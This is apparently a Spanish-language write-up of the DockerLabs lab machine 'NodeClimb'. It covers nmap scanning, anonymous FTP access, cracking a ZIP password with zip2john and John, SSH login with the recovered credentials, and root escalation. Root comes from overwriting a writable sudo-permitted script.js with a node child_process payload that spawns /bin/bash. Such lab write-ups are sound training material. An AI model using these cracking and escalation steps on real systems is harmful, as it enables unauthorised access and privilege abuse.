
**IP:** 172.17.0.2 · **Puertos:** 21 (FTP), 22 (SSH) · **OS:** Linux

---

## Despliegue

Nos situamos en el directorio de la máquina, descomprimimos el zip de DockerLabs y desplegamos el contenedor con el script de auto despliegue:

```bash
/home/kali/MAQUINAS/DockerLabs/NodeClimb
unzip nodeclimb.zip
sudo bash auto_deploy.sh nodeclimb.tar
```

El script nos proporciona la IP del contenedor una vez desplegado: `172.17.0.2`. La registramos como target en nuestra herramienta de gestión:

```bash
settarget 172.17.0.2 NodeClimb
```

---

## Reconocimiento

Antes de escanear comprobamos que la máquina responde a ping para verificar conectividad:

```bash
ping -c 1 172.17.0.2
nmap .sn 172.17.0.2
```

Lanzamos un escaneo completo de todos los puertos con detección agresiva de versiones, scripts de nmap y sin resolución DNS para mayor velocidad. Guardamos el resultado en un archivo:

```bash
nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 172.17.0.2 -oN escaneo
```

Encontramos puerto 21 y 22

![[Pasted image 20260413194007.png]]

El banner FTP nos da información detallada del servidor. Nos llama la atención que la IP de conexión sea `::ffff:172.17.0.1` en lugar de `172.17.0.2` — esto es normal en redes bridge de Docker, donde el host aparece con esa IP desde la perspectiva del contenedor:

```txt
FTP server status:
| Connected to ::ffff:172.17.0.1
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 1
| vsFTPd 3.0.3 - secure, fast, stable
```

---

## Búsqueda de exploits — vsFTPd 3.0.3

Lo primero que hacemos al ver una versión concreta de un servicio es buscar exploits conocidos:

```bash
searchsploit vsftpd 3.0.3
```

![[Pasted image 20260413194104.png]]

Encontramos un exploit posible en Python de Remote Denial of Service. Esto no nos sirve para ganar ningún tipo de acceso a la máquina — solo tiraría el servicio. Se descarta y seguimos enumerando.

---

## Enumeración FTP — login anónimo

Observamos bien el escaneo de nmap y nos encontramos con que el FTP permite **anonymous login** y además tiene un archivo llamado `secretitopicaron.zip`:

![[Pasted image 20260413194900.png]]

Nos conectamos al FTP usando el usuario `Anonymous` con contraseña vacía — una mala práctica de configuración muy común que deja expuesto el servidor a cualquiera:

```bash
ftp 172.17.0.2
```

```txt
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Una vez dentro, buscamos el archivo y lo descargamos a nuestra máquina:

```bash
get secretitopicaron.zip
```

---

## Cracking del ZIP con zip2john + John

Al intentar descomprimir el archivo nos pide contraseña. Usamos `zip2john` para extraer el hash del ZIP en un formato que John pueda entender, y luego lo crackeamos con el diccionario rockyou:

```bash
unzip secretitopicaron.zip
zip2john secretitopicaron.zip > hash.txt
cat hash.txt
```

![[Pasted image 20260413195216.png]]

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260413195309.png]]

John encuentra la contraseña rápidamente ya que estaba en rockyou:

> **Contraseña del ZIP: `password1`**

Ahora descomprimimos el ZIP con esa contraseña y obtenemos un archivo `password.txt` con credenciales en texto claro:

```bash
unzip secretitopicaron.zip
```

Donde encontramos:

> **`mario:laKontraseñAmasmalotaHdelbarrioH`**

---

## Acceso inicial — SSH como mario

Tenemos credenciales válidas para SSH. Antes de conectarnos limpiamos el `known_hosts` para evitar conflictos con la clave del host del contenedor de ejecuciones anteriores:

```bash
ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
ssh mario@172.17.0.2
```

![[Pasted image 20260413195620.png]]

Somos el usuario mario. Empezamos a navegar por el sistema buscando vías de escalada de privilegios.

---

## Escalada de privilegios — sudo node

Buscamos primero binarios con el bit SUID activado, que podrían permitirnos ejecutar algo como root:

```bash
find / -perm 4000 2>/dev/null
```

No encontramos nada relevante. Probamos con los permisos sudo del usuario:

```bash
sudo -l
```

![[Pasted image 20260413200206.png]]

Encontramos algo muy interesante:

```txt
(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

Mario puede ejecutar `node` como root sin contraseña, pero solo con ese script concreto. El comando directo como:

```bash
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

No nos sirve porque el sudo está restringido únicamente a `sudo /usr/bin/node /home/mario/script.js`. Sin embargo, el administrador cometió un error crítico: **restringió el binario y el path del script, pero no el contenido del script**. Mario tiene permisos de escritura sobre ese archivo, así que simplemente sobreescribimos `script.js` con un payload que lanza una bash interactiva, y lo ejecutamos con sudo:

```bash
echo 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})' > /home/mario/script.js
sudo /usr/bin/node /home/mario/script.js
```

![[Pasted image 20260413200631.png]]

Shell como **root** obtenida. Máquina comprometida.

---

## Resumen del ataque

**Vector de entrada:** FTP anónimo expuesto con un archivo ZIP protegido por contraseña débil crackeable con rockyou → credenciales SSH en texto claro dentro del ZIP.

**Escalada:** Permiso sudo mal configurado que restringe el path del script pero no su contenido, permitiendo sobreescribir el script con un payload arbitrario y ejecutarlo como root.

**Lección clave:** Restringir un binario en sudoers no es suficiente si el usuario tiene permisos de escritura sobre los archivos que ese binario ejecuta.
